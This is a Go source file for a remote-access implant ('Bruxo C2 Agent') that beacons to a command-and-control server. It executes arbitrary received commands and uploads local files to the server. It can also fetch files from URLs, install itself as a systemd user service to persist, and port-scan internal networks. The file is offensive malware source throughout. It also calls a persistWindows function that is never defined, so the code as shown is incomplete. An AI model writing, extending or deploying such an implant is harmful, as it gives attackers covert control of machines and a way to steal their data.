package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	c2Server = "http://localhost:8080"
	agentID  string
)

type Task struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

func main() {
	if err := checkIn(); err != nil {
		fmt.Println("Error checking in:", err)
		return
	}

	fmt.Printf("Agent checked in with ID: %s\n", agentID)

	// Loop de beaconing
	for {
		task, err := getTask()
		if err != nil {
			fmt.Println("Error getting task:", err)
			time.Sleep(30 * time.Second) // Aguarda antes de tentar novamente
			continue
		}

		if task.ID != "" {
			fmt.Printf("Received task %s: %s\n", task.ID, task.Command)
			result := executeTask(task)
			if err := postResult(task.ID, result); err != nil {
				fmt.Println("Error posting result:", err)
			}
		}

		time.Sleep(10 * time.Second) // Intervalo de beaconing
	}
}

func checkIn() error {
	hostname, _ := os.Hostname()
	payload := map[string]string{
		"hostname": hostname,
		"os":       runtime.GOOS,
	}

	jsonPayload, _ := json.Marshal(payload)

	resp, err := http.Post(c2Server+"/c2/checkin", "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var result map[string]string
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return err
	}

	agentID = result["id"]
	return nil
}

func getTask() (Task, error) {
	var task Task
	resp, err := http.Get(fmt.Sprintf("%s/c2/tasks/%s", c2Server, agentID))
	if err != nil {
		return task, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return task, nil // No new task
	}

	if err := json.NewDecoder(resp.Body).Decode(&task); err != nil {
		return task, err
	}

	return task, nil
}

func executeTask(task Task) string {
	parts := strings.Split(task.Command, " ")
	command := parts[0]

	switch command {
	case "internal_scan":
		if len(parts) < 2 {
			return "Usage: internal_scan <CIDR_range>"
		}
		return handleInternalScan(parts[1])
	case "persist":
		return handlePersistence()
	case "upload":
		if len(parts) < 2 {
			return "Usage: upload <local_file_path>"
		}
		return handleUpload(parts[1])
	case "download":
		if len(parts) < 3 {
			return "Usage: download <file_url> <destination_path>"
		}
		return handleDownload(parts[1], parts[2])
	default:
		cmd := exec.Command(command, parts[1:]...)
		var out bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &out

		err := cmd.Run()
		if err != nil {
			return fmt.Sprintf("Error executing command: %s\n%s", err.Error(), out.String())
		}
		return out.String()
	}
}

func handleUpload(filePath string) string {
	fileData, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Sprintf("Could not read file: %s", err.Error())
	}

	url := fmt.Sprintf("%s/c2/upload/%s?file=%s", c2Server, agentID, filePath)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(fileData))
	if err != nil {
		return fmt.Sprintf("Could not create request: %s", err.Error())
	}
	req.Header.Set("Content-Type", "application/octet-stream")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Sprintf("Error uploading file: %s", err.Error())
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return fmt.Sprintf("File '%s' uploaded successfully.", filePath)
	}
	return fmt.Sprintf("File upload failed with status: %s", resp.Status)
}

func handleDownload(fileURL, destPath string) string {
	resp, err := http.Get(fileURL)
	if err != nil {
		return fmt.Sprintf("Error downloading file: %s", err.Error())
	}
	defer resp.Body.Close()

	fileData, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Sprintf("Error reading downloaded content: %s", err.Error())
	}

	if err := os.WriteFile(destPath, fileData, 0644); err != nil {
		return fmt.Sprintf("Error writing file to destination: %s", err.Error())
	}

	return fmt.Sprintf("File downloaded from '%s' and saved to '%s'", fileURL, destPath)
}

func handlePersistence() string {
	switch runtime.GOOS {
	case "linux":
		return persistLinux()
	case "windows":
		return persistWindows()
	default:
		return fmt.Sprintf("Persistence not supported on %s", runtime.GOOS)
	}
}

func persistLinux() string {
	exePath, err := os.Executable()
	if err != nil {
		return "Error getting executable path: " + err.Error()
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return "Error getting user home directory: " + err.Error()
	}

	serviceDir := filepath.Join(homeDir, ".config", "systemd", "user")
	if err := os.MkdirAll(serviceDir, 0755); err != nil {
		return "Error creating systemd user directory: " + err.Error()
	}

	servicePath := filepath.Join(serviceDir, "bruxo-agent.service")
	serviceContent := fmt.Sprintf(`[Unit]
Description=Bruxo C2 Agent

[Service]
ExecStart=%s
Restart=always

[Install]
WantedBy=default.target
`, exePath)

	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return "Error writing systemd service file: " + err.Error()
	}

	cmdReload := exec.Command("systemctl", "--user", "daemon-reload")
	if err := cmdReload.Run(); err != nil {
		return "Error reloading systemd daemon: " + err.Error()
	}

	cmdEnable := exec.Command("systemctl", "--user", "enable", "--now", "bruxo-agent.service")
	if err := cmdEnable.Run(); err != nil {
		return "Error enabling systemd service: " + err.Error()
	}

	return "Persistence established successfully via systemd user service."
}

func handleInternalScan(cidr string) string {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return fmt.Sprintf("Invalid CIDR: %s", err.Error())
	}

	var ips []string
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		ips = append(ips, ip.String())
	}

	ports := []int{21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443}
	var results []string
	var wg sync.WaitGroup
	var mu sync.Mutex

	// Limitar a concorrência
	concurrency := 100
	sem := make(chan bool, concurrency)

	for _, ip := range ips[1 : len(ips)-1] { // Pular endereço de rede e broadcast
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			sem <- true
			defer func() { <-sem }()

			for _, port := range ports {
				address := fmt.Sprintf("%s:%d", ip, port)
				conn, err := net.DialTimeout("tcp", address, 1*time.Second)
				if err == nil {
					conn.Close()
					mu.Lock()
					results = append(results, address)
					mu.Unlock()
				}
			}
		}(ip)
	}

	wg.Wait()

	if len(results) == 0 {
		return "No open ports found in the specified range."
	}

	return "Found open ports:\n" + strings.Join(results, "\n")
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func postResult(taskID, result string) error {
	payload := map[string]string{
		"task_id": taskID,
		"result":  result,
	}

	jsonPayload, _ := json.Marshal(payload)

	url := fmt.Sprintf("%s/c2/results/%s", c2Server, agentID)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonPayload))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}
